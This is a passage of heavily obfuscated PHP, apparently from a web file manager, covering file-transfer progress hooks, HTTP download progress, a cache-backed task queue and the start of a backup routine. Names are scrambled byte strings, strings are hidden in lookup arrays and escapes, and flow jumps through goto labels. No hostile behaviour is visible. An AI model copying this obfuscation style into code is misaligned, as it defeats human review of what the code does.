$E•šâ§Øˆ«[$d³™ó‡¤íˆ[361]] : $d³™ó‡¤íˆ[33]), $this->parseLimit(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[288]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[288]] : $d³™ó‡¤íˆ[33]), $this->parseUnion(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[343]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[343]] : $d³™ó‡¤íˆ[33]), $this->parseComment(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[350]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[350]] : $d³™ó‡¤íˆ[33])), $f¿î¼È°Û); return $f¿î¼È°Û; } public function getLastSql($Cæ£Ì§Šó = '') { return $Cæ£Ì§Šó ? $this->modelSql[$Cæ£Ì§Šó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fÃˆˆ£¯”) { return addslashes($fÃˆˆ£¯”); } public function setModel($C²™÷»ÏÈÍ) { $this->model = $C²™÷»ÏÈÍ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto e©©­Ë¢İö; FÕ¨ŠŒ†Şİ: class TaskFileTransfer extends Task { protected function startAfter() { goto E¿íÃÆŸÅĞ; cªİ¥££æ³: Hook::bind($cé‘ÃÍùàœ[1541], array($this, $cé‘ÃÍùàœ[1542])); Hook::bind($cé‘ÃÍùàœ[1543], array($this, $cé‘ÃÍùàœ[1544])); Hook::bind($cé‘ÃÍùàœ[1545], array($this, $cé‘ÃÍùàœ[1546])); goto bàÜß‚Î‚; CÇÅãØÕ‘†: $d•œÖÕçã[$cé‘ÃÍùàœ[1553]] = 0; $d•œÖÕçã[$cé‘ÃÍùàœ[1554]] = 0; if (!$d•œÖÕçã[$cé‘ÃÍùàœ[1411]]) { $d•œÖÕçã[$cé‘ÃÍùàœ[1411]] = LNG($cé‘ÃÍùàœ[1555]); } goto D©‚†¬ŒÑ; cÔ·ˆÈÉ”Š: Hook::bind($cé‘ÃÍùàœ[534], array($this, $cé‘ÃÍùàœ[1537])); Hook::bind($cé‘ÃÍùàœ[536], array($this, $cé‘ÃÍùàœ[1537])); Hook::bind($cé‘ÃÍùàœ[538], array($this, $cé‘ÃÍùàœ[1537])); goto dèƒÛ÷‹ÃÀ; bàÜß‚Î‚: $d•œÖÕçã[$cé‘ÃÍùàœ[1547]] = LNG($cé‘ÃÍùàœ[1548]); $d•œÖÕçã[$cé‘ÃÍùàœ[1549]] = 0; $d•œÖÕçã[$cé‘ÃÍùàœ[1550]] = 0; goto A¿Ò¬†í°œ; E¿Ÿ¥ò¡‘: Hook::bind($cé‘ÃÍùàœ[1529], array($this, $cé‘ÃÍùàœ[1530])); Hook::bind($cé‘ÃÍùàœ[1086], array($this, $cé‘ÃÍùàœ[1531])); Hook::bind($cé‘ÃÍùàœ[1532], array($this, $cé‘ÃÍùàœ[1533])); goto BÉñ§Ï¦†; A¿Ò¬†í°œ: $d•œÖÕçã[$cé‘ÃÍùàœ[1001]] = $cé‘ÃÍùàœ[33]; $d•œÖÕçã[$cé‘ÃÍùàœ[1551]] = $cé‘ÃÍùàœ[33]; $d•œÖÕçã[$cé‘ÃÍùàœ[1552]] = 0; goto CÇÅãØÕ‘†; dèƒÛ÷‹ÃÀ: Hook::bind($cé‘ÃÍùàœ[1538], array($this, $cé‘ÃÍùàœ[1539])); Hook::bind($cé‘ÃÍùàœ[554], array($this, $cé‘ÃÍùàœ[1540])); $this->sourceModelCopyFlag = !1; goto cªİ¥££æ³; BÉñ§Ï¦†: Hook::bind($cé‘ÃÍùàœ[561], array($this, $cé‘ÃÍùàœ[1534])); Hook::bind($cé‘ÃÍùàœ[562], array($this, $cé‘ÃÍùàœ[1535])); Hook::bind($cé‘ÃÍùàœ[564], array($this, $cé‘ÃÍùàœ[1536])); goto a³ÑğÈÓº…; E¿íÃÆŸÅĞ: $cé‘ÃÍùàœ =& $_SERVER[µ…]; $d•œÖÕçã =& $this->task; $this->sourceCopyFolder = !1; goto E¿Ÿ¥ò¡‘; a³ÑğÈÓº…: Hook::bind($cé‘ÃÍùàœ[565], array($this, $cé‘ÃÍùàœ[1536])); Hook::bind($cé‘ÃÍùàœ[532], array($this, $cé‘ÃÍùàœ[1537])); Hook::bind($cé‘ÃÍùàœ[529], array($this, $cé‘ÃÍùàœ[1537])); goto cÔ·ˆÈÉ”Š; D©‚†¬ŒÑ: } protected function endAfter() { goto fŸƒ‡ùä¤; BÜÌ‚­öğ: Hook::unbind($D—»Ş¬¤‰°[529], array($this, $D—»Ş¬¤‰°[1537])); Hook::unbind($D—»Ş¬¤‰°[534], array($this, $D—»Ş¬¤‰°[1537])); Hook::unbind($D—»Ş¬¤‰°[536], array($this, $D—»Ş¬¤‰°[1537])); goto CíÉ‡Êö‰š; fŸƒ‡ùä¤: $D—»Ş¬¤‰° =& $_SERVER[µ…]; Hook::unbind($D—»Ş¬¤‰°[1529], array($this, $D—»Ş¬¤‰°[1530])); Hook::unbind($D—»Ş¬¤‰°[1086], array($this, $D—»Ş¬¤‰°[1531])); goto DÄØ˜™‰ºÂ; Aé°°ßóËÔ: Hook::unbind($D—»Ş¬¤‰°[1541], array($this, $D—»Ş¬¤‰°[1542])); Hook::unbind($D—»Ş¬¤‰°[1543], array($this, $D—»Ş¬¤‰°[1544])); Hook::unbind($D—»Ş¬¤‰°[1545], array($this, $D—»Ş¬¤‰°[1546])); goto fòÈ“Ë¡˜; B­ôÄ™ËÊ: Hook::unbind($D—»Ş¬¤‰°[564], array($this, $D—»Ş¬¤‰°[1536])); Hook::unbind($D—»Ş¬¤‰°[565], array($this, $D—»Ş¬¤‰°[1536])); Hook::unbind($D—»Ş¬¤‰°[532], array($this, $D—»Ş¬¤‰°[1537])); goto BÜÌ‚­öğ; DÄØ˜™‰ºÂ: Hook::unbind($D—»Ş¬¤‰°[1532], array($this, $D—»Ş¬¤‰°[1533])); Hook::unbind($D—»Ş¬¤‰°[561], array($this, $D—»Ş¬¤‰°[1534])); Hook::unbind($D—»Ş¬¤‰°[562], array($this, $D—»Ş¬¤‰°[1535])); goto B­ôÄ™ËÊ; CíÉ‡Êö‰š: Hook::unbind($D—»Ş¬¤‰°[538], array($this, $D—»Ş¬¤‰°[1537])); Hook::unbind($D—»Ş¬¤‰°[1538], array($this, $D—»Ş¬¤‰°[1539])); Hook::unbind($D—»Ş¬¤‰°[554], array($this, $D—»Ş¬¤‰°[1540])); goto Aé°°ßóËÔ; fòÈ“Ë¡˜: } public function copyMoveStart($eîƒ‹÷·×Ó, $aàê•å¦‹á, $a¹ÛÔæŞÑ°, $D¸„¥²éšå) { goto eÃ½ìéŸ¦; eÃ½ìéŸ¦: $dÎŠœÃÑ× =& $_SERVER[µ…]; self::log($dÎŠœÃÑ×[1556] . $aàê•å¦‹á . $dÎŠœÃÑ×[66] . $D¸„¥²éšå); $C¾¾àßï‡× = rtrim(TEMP_FILES, $dÎŠœÃÑ×[8]); goto eÎçÜåáÅ÷; aó‹ÛĞÁãï: $Eğ¤ËœÚ³¼[$dÎŠœÃÑ×[1557]] = KodIO::transferType($eîƒ‹÷·×Ó, $a¹ÛÔæŞÑ°); $this->update(); goto B÷ˆ¤Ê¾ƒƒ; eÎçÜåáÅ÷: if (substr($aàê•å¦‹á, 0, strlen($C¾¾àßï‡×)) == $C¾¾àßï‡×) { return; } if (substr($D¸„¥²éšå, 0, strlen($C¾¾àßï‡×)) == $C¾¾àßï‡×) { return; } $Eğ¤ËœÚ³¼ =& $this->task; goto aó‹ÛĞÁãï; B÷ˆ¤Ê¾ƒƒ: } public function updateAfter() { goto BŒŸ‰¤ÂƒÆ; bŒÍîƒ‡‡©: if ($this->sourceModelCopyFlag) { return; } if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1557]] == $eòò¼Ã¾§à[1158]) { return; } if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1557]] == $eòò¼Ã¾§à[1071] || $A„œ½ß¯ëì[$eòò¼Ã¾§à[1557]] == $eòò¼Ã¾§à[106]) { if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1551]]) { $A„œ½ß¯ëì[$eòò¼Ã¾§à[1554]] = $A„œ½ß¯ëì[$eòò¼Ã¾§à[1553]] + $A„œ½ß¯ëì[$eòò¼Ã¾§à[1550]]; } } else { if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1557]] == $eòò¼Ã¾§à[1159]) { if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1551]] == $eòò¼Ã¾§à[1071]) { $A„œ½ß¯ëì[$eòò¼Ã¾§à[1554]] = $A„œ½ß¯ëì[$eòò¼Ã¾§à[1553]] + $A„œ½ß¯ëì[$eòò¼Ã¾§à[1550]] * 0.5; } else { if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1551]] == $eòò¼Ã¾§à[106]) { $A„œ½ß¯ëì[$eòò¼Ã¾§à[1554]] = $A„œ½ß¯ëì[$eòò¼Ã¾§à[1553]] + $A„œ½ß¯ëì[$eòò¼Ã¾§à[1549]] * 0.5 + $A„œ½ß¯ëì[$eòò¼Ã¾§à[1550]] * 0.5; } } } } goto b–ÏÆ×íÚ; b–ÏÆ×íÚ: $A„œ½ß¯ëì[$eòò¼Ã¾§à[1507]] = $A„œ½ß¯ëì[$eòò¼Ã¾§à[1554]] / $A„œ½ß¯ëì[$eòò¼Ã¾§à[713]]; if ($A„œ½ß¯ëì[$eòò¼Ã¾§à[1507]] > 0) { $d¶ëêòÃŞæ = timeFloat() - $A„œ½ß¯ëì[$eòò¼Ã¾§à[735]] - $A„œ½ß¯ëì[$eòò¼Ã¾§à[1510]]; $A„œ½ß¯ëì[$eòò¼Ã¾§à[1511]] = $d¶ëêòÃŞæ * (1 - $A„œ½ß¯ëì[$eòò¼Ã¾§à[1507]]) / $A„œ½ß¯ëì[$eòò¼Ã¾§à[1507]]; } goto Bõàğ½èö; BŒŸ‰¤ÂƒÆ: $eòò¼Ã¾§à =& $_SERVER[µ…]; $A„œ½ß¯ëì =& $this->task; if (!$A„œ½ß¯ëì[$eòò¼Ã¾§à[713]]) { return; } goto bŒÍîƒ‡‡©; Bõàğ½èö: } public function addPath($e–õŸŸ¬¶ï) { goto cŠà‘¾õ‚š; AÊ»Ö‰ÙÁ: if ($aÍòùğ°ò[$BŠÔ¤êº‡õ[29]] == $BŠÔ¤êº‡õ[191]) { $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[999]] += 1; } else { $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[999]] += $aÍòùğ°ò[$BŠÔ¤êº‡õ[80]][$BŠÔ¤êº‡õ[78]]; if ($aÍòùğ°ò[$BŠÔ¤êº‡õ[390]]) { $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[999]] += $aÍòùğ°ò[$BŠÔ¤êº‡õ[80]][$BŠÔ¤êº‡õ[79]] + 1; } } $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[713]] += $aÍòùğ°ò[$BŠÔ¤êº‡õ[77]]; $this->update(); goto eã¶‰ØƒÜ; BÅÇ ¼³à: $aÍòùğ°ò = IO::infoWithChildren($e–õŸŸ¬¶ï); $fØ„Š¥‹¦œ = $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[1558]] ? $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[1558]][$BŠÔ¤êº‡õ[1559]] : 0; $EêÈ–½¢Ü¸[$BŠÔ¤êº‡õ[1558]] = array($BŠÔ¤êº‡õ[1559] => $fØ„Š¥‹¦œ + 1, $BŠÔ¤êº‡õ[407] => $aÍòùğ°ò[$BŠÔ¤êº‡õ[28]], $BŠÔ¤êº‡õ[75] => $aÍòùğ°ò[$BŠÔ¤êº‡õ[75]], $BŠÔ¤êº‡õ[489] => $aÍòùğ°ò[$BŠÔ¤êº‡õ[489]] ? $aÍòùğ°ò[$BŠÔ¤êº‡õ[489]] : $aÍòùğ°ò[$BŠÔ¤êº‡õ[75]]); goto AÊ»Ö‰ÙÁ; cŠà‘¾õ‚š: $BŠÔ¤êº‡õ =& $_SERVER[µ…]; if (!$e–õŸŸ¬¶ï) { return; } $EêÈ–½¢Ü¸ =& $this->task; goto BÅÇ ¼³à; eã¶‰ØƒÜ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Cë‰ÕÌáï) { $eÆ×†–‚«Æ =& $_SERVER[µ…]; $D‘ğĞÄóÌÈ =& $this->task; $D‘ğĞÄóÌÈ[$eÆ×†–‚«Æ[1547]] = $Cë‰ÕÌáï[$eÆ×†–‚«Æ[28]]; $D‘ğĞÄóÌÈ[$eÆ×†–‚«Æ[1001]] = $Cë‰ÕÌáï[$eÆ×†–‚«Æ[28]]; $this->update(); } public function copyFileStart($A¸à°ºµÚ§, $eÅØš­÷…å, $B„ãÖĞÛ­, $eõæ§‚‡’, $c„ åÏèí, $EçÄ÷ª³ô) { goto fÛ©Ó§¿áÈ; d¤ôĞãö„œ: $GLOBALS[$cí‘º×ÙêÂ[1561]] = $c„ åÏèí; $GLOBALS[$cí‘º×ÙêÂ[1560]] = $EçÄ÷ª³ô; $c±ÜŞŞ¼¦ƒ =& $this->task; goto E®×´ƒôÚâ; fÛ©Ó§¿áÈ: $cí‘º×ÙêÂ =& $_SERVER[µ…]; $Fˆ½âµ°Š· = $c„ åÏèí; if ($Fˆ½âµ°Š· == $GLOBALS[$cí‘º×ÙêÂ[1560]]) { $Fˆ½âµ°Š· = $GLOBALS[$cí‘º×ÙêÂ[1561]]; } goto d¤ôĞãö„œ; BÉ˜äğÉò×: $this->update(); goto f«ô±¶´œ; E®×´ƒôÚâ: $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1547]] = $Fˆ½âµ°Š·; $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1549]] = (int) $A¸à°ºµÚ§->size($eÅØš­÷…å); $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1550]] = 0; goto BÓ¦·÷ƒ‡ß; BÓ¦·÷ƒ‡ß: $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1001]] = $cí‘º×ÙêÂ[33]; $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1551]] = $cí‘º×ÙêÂ[33]; $c±ÜŞŞ¼¦ƒ[$cí‘º×ÙêÂ[1552]] = 0; goto BÉ˜äğÉò×; f«ô±¶´œ: } public function copyFileEnd($E÷æŞ¢ô±, $CÖ’ëÉÃ×, $fÉ²•œ¾¶à, $F«æğÜòğÃ, $d¿§ù‚çÙ, $a‚¥èĞ•) { $b¤´Ùò¯ëá =& $_SERVER[µ…]; $eçõçÒµåË =& $this->task; $eçõçÒµåË[$b¤´Ùò¯ëá[1550]] = $eçõçÒµåË[$b¤´Ùò¯ëá[1549]]; $eçõçÒµåË[$b¤´Ùò¯ëá[1551]] = $b¤´Ùò¯ëá[33]; if ($d¿§ù‚çÙ == $eçõçÒµåË[$b¤´Ùò¯ëá[1547]]) { $eçõçÒµåË[$b¤´Ùò¯ëá[1553]] += $eçõçÒµåË[$b¤´Ùò¯ëá[1549]]; $eçõçÒµåË[$b¤´Ùò¯ëá[1554]] = $eçõçÒµåË[$b¤´Ùò¯ëá[1553]]; $this->update(1); } else { $this->update(); $eçõçÒµåË[$b¤´Ùò¯ëá[1550]] = 0; } self::log($b¤´Ùò¯ëá[1562] . $CÖ’ëÉÃ× . $b¤´Ùò¯ëá[66] . $F«æğÜòğÃ . $b¤´Ùò¯ëá[227] . $d¿§ù‚çÙ . $b¤´Ùò¯ëá[1563] . $eçõçÒµåË[$b¤´Ùò¯ëá[1547]]); } public function updateFileEnd($Eë÷¤º’–¥, $b‚‚¶Â³) { goto B ÖùÃ„œ‹; fŠ‰‰Ã¹­: $this->update(1); self::log($Bó‡·Ò­‘[1564] . $Eë÷¤º’–¥); goto DŞ§†ˆ¸“; bàŒÛõ¤ïÕ: $a×ÑŠ‘¢Ì©[$Bó‡·Ò­‘[1549]] = $b‚‚¶Â³; $a×ÑŠ‘¢Ì©[$Bó‡·Ò­‘[1553]] += $b‚‚¶Â³; $a×ÑŠ‘¢Ì©[$Bó‡·Ò­‘[1554]] = $a×ÑŠ‘¢Ì©[$Bó‡·Ò­‘[1553]]; goto fŠ‰‰Ã¹­; B ÖùÃ„œ‹: $Bó‡·Ò­‘ =& $_SERVER[µ…]; $a×ÑŠ‘¢Ì© =& $this->task; $a×ÑŠ‘¢Ì©[$Bó‡·Ò­‘[1547]] = $Eë÷¤º’–¥; goto bàŒÛõ¤ïÕ; DŞ§†ˆ¸“: } public function sourceModelCopy($e—óŠë İ„) { goto F„…× ¤šõ; f÷†ìí‚œÆ: $E•“•Àéƒ =& $this->task; $this->sourceModelCopyFlag = !0; $D è“‚—á– = 0; goto ešâùç† ; F„…× ¤šõ: $fô‘†‚¼¼— =& $_SERVER[µ…]; $bï˜Èö¯è = $e—óŠë İ„[0]; $FÑì’ö…¶³ = $e—óŠë İ„[1]; goto f÷†ìí‚œÆ; ešâùç† : switch ($bï˜Èö¯è) { case $fô‘†‚¼¼—[530]: $D è“‚—á– = 1; break; case $fô‘†‚¼¼—[533]: $E•“•Àéƒ[$fô‘†‚¼¼—[1547]] = $FÑì’ö…¶³[$fô‘†‚¼¼—[28]]; break; case $fô‘†‚¼¼—[535]: $D è“‚—á– = intval($e—óŠë İ„[$fô‘†‚¼¼—[375]] * 0.4); break; case $fô‘†‚¼¼—[537]: $D è“‚—á– = intval($e—óŠë İ„[$fô‘†‚¼¼—[375]] * 0.2); break; case $fô‘†‚¼¼—[539]: $D è“‚—á– = intval($e—óŠë İ„[$fô‘†‚¼¼—[375]] * 0.4); break; } $this->update($D è“‚—á–); $this->sourceModelCopyFlag = !1; goto Bâ¨íö«ù; Bâ¨íö«ù: } public function sourceRemove($b›‚ˆ ÃÙß, $f…Ğà÷åä‹) { $c¶ê…ŒõÇË =& $_SERVER[µ…]; $this->sourceModelCopyFlag = !0; $aôØ›ì¶œ = 1; if (isset($b›‚ˆ ÃÙß[$c¶ê…ŒõÇË[80]])) { $aôØ›ì¶œ = $b›‚ˆ ÃÙß[$c¶ê…ŒõÇË[80]][$c¶ê…ŒõÇË[78]] + $b›‚ˆ ÃÙß[$c¶ê…ŒõÇË[80]][$c¶ê…ŒõÇË[79]] + 1; } $this->update($aôØ›ì¶œ); $this->sourceModelCopyFlag = !1; } public function sourceMove($B‘¦íæÄË) { $this->sourceRemove($B‘¦íæÄË, !1); } public function curlProgress($DÜ³¡¢¯Š, $cÔâÈŠƒ™†, $B±­½­¼›É, $AÆªîôêÊŞ, $Dö¤î·šä²) { $CÀ†ØŠğÌ¾ =& $_SERVER[µ…]; $AµËÑÍ‘«“ =& $this->task; if ($Dö¤î·šä² > 0) { $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1001]] = $CÀ†ØŠğÌ¾[1565]; $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1551]] = $CÀ†ØŠğÌ¾[106]; if ($AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1549]]) { $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1550]] = $Dö¤î·šä²; } if ($AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1552]]) { $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1550]] = $Dö¤î·šä² + $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1552]]; } } else { if ($B±­½­¼›É > 0) { if ($AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1549]] == $cÔâÈŠƒ™†) { $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1550]] = $B±­½­¼›É; $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1001]] = $CÀ†ØŠğÌ¾[1566]; $AµËÑÍ‘«“[$CÀ†ØŠğÌ¾[1551]] = $CÀ†ØŠğÌ¾[1071]; } } } $this->update(); } public function curlProgressStart($eÃø¾˜Ììø) { } public function curlProgressEnd($fÇ¾’¥¬¬ˆ) { goto BÖÚÙöõÍ”; BÖÚÙöõÍ”: $Fªµƒ³„“¿ =& $_SERVER[µ…]; $E”µ¿Ø…ÎÓ =& $this->task; $A‹ĞÑàÊ­ = curl_getinfo($fÇ¾’¥¬¬ˆ); goto föõ¾³”êÆ; föõ¾³”êÆ: $f¼ë—ì¬²õ = $A‹ĞÑàÊ­[$Fªµƒ³„“¿[1567]]; if ($f¼ë—ì¬²õ == -1) { $f¼ë—ì¬²õ = $A‹ĞÑàÊ­[$Fªµƒ³„“¿[1568]]; } if ($E”µ¿Ø…ÎÓ[$Fªµƒ³„“¿[1551]] == $Fªµƒ³„“¿[106] && $f¼ë—ì¬²õ) { $E”µ¿Ø…ÎÓ[$Fªµƒ³„“¿[1552]] += $f¼ë—ì¬²õ; } goto dÅ†À Ú¸; dÅ†À Ú¸: $this->update(); goto c¬ÛíÎñÚœ; c¬ÛíÎñÚœ: } } class TaskHttp extends Task { protected function startAfter() { $Bâçöö¢ÄŠ =& $_SERVER[µ…]; $eİ÷Š†ª† =& $this->task; $eİ÷Š†ª†[$Bâçöö¢ÄŠ[1569]] = 1; Hook::bind($Bâçöö¢ÄŠ[1541], array($this, $Bâçöö¢ÄŠ[1570])); Hook::bind($Bâçöö¢ÄŠ[1543], array($this, $Bâçöö¢ÄŠ[1571])); Hook::bind($Bâçöö¢ÄŠ[1545], array($this, $Bâçöö¢ÄŠ[1572])); } protected function endAfter() { $CÖÕ«îÁ =& $_SERVER[µ…]; Hook::unbind($CÖÕ«îÁ[1541], array($this, $CÖÕ«îÁ[1570])); Hook::unbind($CÖÕ«îÁ[1543], array($this, $CÖÕ«îÁ[1571])); Hook::unbind($CÖÕ«îÁ[1545], array($this, $CÖÕ«îÁ[1572])); } public function progressStart($A¤‘è™°Ñ) { $e÷ö¡í´Ë‘ =& $_SERVER[µ…]; $Dê¹²…¬É = curl_getinfo($A¤‘è™°Ñ); self::log($e÷ö¡í´Ë‘[1573] . $Dê¹²…¬É[$e÷ö¡í´Ë‘[303]]); self::valueSet($this->task[$e÷ö¡í´Ë‘[388]], $this->task); } public function progressEnd($D¯¯ÅĞ×¶) { $B­Ù¨ÇµÄ³ =& $_SERVER[µ…]; self::log($B­Ù¨ÇµÄ³[1574] . $this->task[$B­Ù¨ÇµÄ³[388]]); $this->end(); } public function progress($dƒ©ñÙ““”, $CÛÔ™›À¿Ã, $fãÌ½ùËŸ, $bË¬Í´¢Ş·, $Cê¢°Û„…Ä) { $aˆšÂÏƒê =& $_SERVER[µ…]; $c‚®º½ò‚ =& $this->task; if ($Cê¢°Û„…Ä > 0) { $c‚®º½ò‚[$aˆšÂÏƒê[999]] = $c‚®º½ò‚[$aˆšÂÏƒê[999]] == 0 ? $bË¬Í´¢Ş· : $c‚®º½ò‚[$aˆšÂÏƒê[999]]; $c‚®º½ò‚[$aˆšÂÏƒê[1013]] = $Cê¢°Û„…Ä; } else { if ($fãÌ½ùËŸ > 0) { $c‚®º½ò‚[$aˆšÂÏƒê[999]] = $c‚®º½ò‚[$aˆšÂÏƒê[999]] == 0 ? $CÛÔ™›À¿Ã : $c‚®º½ò‚[$aˆšÂÏƒê[999]]; $c‚®º½ò‚[$aˆšÂÏƒê[1013]] = $fãÌ½ùËŸ; } } $this->update(); self::log("\x70\162\157\147\162\x65\163\x73\110\x74\164\160\x3a\x64\x6f\167\156\x3a{$fãÌ½ùËŸ}\57{$CÛÔ™›À¿Ã}\73\x20\165\x70\x6c\x6f\x61\144\72{$Cê¢°Û„…Ä}\57{$bË¬Í´¢Ş·}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\153\121\165\x65\165\145\x4c\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\165\x65\165\145\104\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($eÖ°³…¶…, $CéˆİæğŸß = array(), $C•ÚÒ¯Å Ü = '', $b°‚œÂœˆ = '') { $FÎ©Œ¡Ğµ =& $_SERVER[µ…]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($b°‚œÂœˆ && array_find_by_field(self::$listData, $FÎ©Œ¡Ğµ[92], $b°‚œÂœˆ)) { return !0; } self::$listData[] = array($FÎ©Œ¡Ğµ[260] => $eÖ°³…¶…, $FÎ©Œ¡Ğµ[1575] => $CéˆİæğŸß, $FÎ©Œ¡Ğµ[425] => $C•ÚÒ¯Å Ü, $FÎ©Œ¡Ğµ[92] => $b°‚œÂœˆ); return !0; } public static function addSubmit() { $DºŞá¯Ñ¡ƒ =& $_SERVER[µ…]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($DºŞá¯Ñ¡ƒ[1576] . json_encode_force(array_to_keyvalue(self::$listData, $DºŞá¯Ñ¡ƒ[33], $DºŞá¯Ñ¡ƒ[425])), $DºŞá¯Ñ¡ƒ[1577]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($a£¿·Áä“, $aà¬®‰à„Û = array(), $DèÜæ§¸Å® = '', $b¢ŒÕŸ…óè = '') { goto EŠ…ËˆñÇ’; C¾Ìèê‘“„: if ($b¢ŒÕŸ…óè && array_find_by_field($eÃİÊ¯°Êî, $cÏÜ©„¬[92], $b¢ŒÕŸ…óè)) { return !0; } $eÃİÊ¯°Êî[] = array($cÏÜ©„¬[260] => $a£¿·Áä“, $cÏÜ©„¬[1575] => $aà¬®‰à„Û, $cÏÜ©„¬[425] => $DèÜæ§¸Å®, $cÏÜ©„¬[92] => $b¢ŒÕŸ…óè); write_log($cÏÜ©„¬[1576] . $DèÜæ§¸Å®, $cÏÜ©„¬[1577]); goto D èÃäµåè; D èÃäµåè: self::setAll($eÃİÊ¯°Êî); return !0; goto D½æ¨ŠÃäœ; EŠ…ËˆñÇ’: $cÏÜ©„¬ =& $_SERVER[µ…]; if (self::count() >= self::MAX_LENGTH) { return !1; } $eÃİÊ¯°Êî = self::getAll(); goto C¾Ìèê‘“„; D½æ¨ŠÃäœ: } public static function run() { goto bŞäù’©ç’; Fš‘±è®Ã: return !0; goto e˜ùÓ…Êô¡; DšİŒ¤¿»¤: if (!$dÒ¦·ëƒ) { return !1; } self::setAll($A‡ Åë×Ş™); $c…ï´åÄ®« = timeFloat(); goto A’É½Ù°Ó¸; bŞäù’©ç’: $fœÇ›ˆ±µ² =& $_SERVER[µ…]; $A‡ Åë×Ş™ = self::getAll(); $dÒ¦·ëƒ = array_shift($A‡ Åë×Ş™); goto DšİŒ¤¿»¤; A’É½Ù°Ó¸: try { Hook::apply($dÒ¦·ëƒ[$fœÇ›ˆ±µ²[260]], $dÒ¦·ëƒ[$fœÇ›ˆ±µ²[1575]]); } catch (Exception $C¡éÈ‚‡à‰) { } $Dçàç¿† = number_format(timeFloat() - $c…ï´åÄ®«, 3) . $fœÇ›ˆ±µ²[1519]; write_log($fœÇ›ˆ±µ²[1578] . $dÒ¦·ëƒ[$fœÇ›ˆ±µ²[425]] . $fœÇ›ˆ±µ²[1579] . $Dçàç¿†, $fœÇ›ˆ±µ²[1577]); goto Fš‘±è®Ã; e˜ùÓ…Êô¡: } public static function count() { $A¾¡—ë†¶‡ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$A¾¡—ë†¶‡) { return 0; } return intval($A¾¡—ë†¶‡); } public static function getAll() { $dá¯æ†à¶÷ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$dá¯æ†à¶÷) { return array(); } return $dá¯æ†à¶÷; } public static function setAll($a…­Ê¸¥ñ) { $Fä´¿Ÿğ¸¯ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($a…­Ê¸¥ñ), $Fä´¿Ÿğ¸¯); Cache::set(self::QUEUE_DATA, $a…­Ê¸¥ñ, $Fä´¿Ÿğ¸¯); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto eòâÂ…•œÈ; eçÂŞãöäÑ: class BackupFile { public function __construct() { } public function index() { goto EÒÎ«è¢¹ã; E¼œ——¬îõ: $D±ß­‘¹ÀÇ = (int) Model($_SERVER[µ…][733])->where($FÎ›Ò…¯µØ)->count($_SERVER[µ…][441]); $D´²ëó‘İ† = (int) Model($_SERVER[µ…][733])->where($FÎ›Ò…¯µØ)->sum($_SERVER[µ…][77]); $B¶¶ÄöÑ¹ = new TaskFileTransfer($_SERVER[µ…][755], $_SERVER[µ…][728], $D±ß­‘¹ÀÇ, LNG($_SERVER[µ…][729]) . $_SERVER[µ…][730] . LNG($_SERVER[µ…][756])); goto C‡¶Öõáñ; D­‡è¸ÔÉ: $C‚”ãíÉ… = array($_SERVER[µ…][768] => 1, $_SERVER[µ…][470] => time(), $_SERVER[µ…][723] => 1, $_SERVER[µ…][765] => $BôÍ’Û¾›’, $_SERVER[µ…][758] => $D´²ëó‘İ†, $_SERVER[µ…][757] => $D±ß­‘¹ÀÇ); if ($B©Š‘˜§¾) { $C‚”ãíÉ…[$_SERVER[µ…][766]] = $F–§Î×òØ; $C‚”ãíÉ…[$_SERVER[µ…][767]] = $d×ãİ¡¡¹á; } Backup::set($C‚”ãíÉ…); goto aõÅœ¯ã²å; CïÉŒ†¶Êì: $fé¼¼ î“ = 1000; $FÇíˆ‚… ¼ = $B©Š‘˜§¾ = 0; $d›œÂ—Êİ  = array(); goto B¾§µêí ; 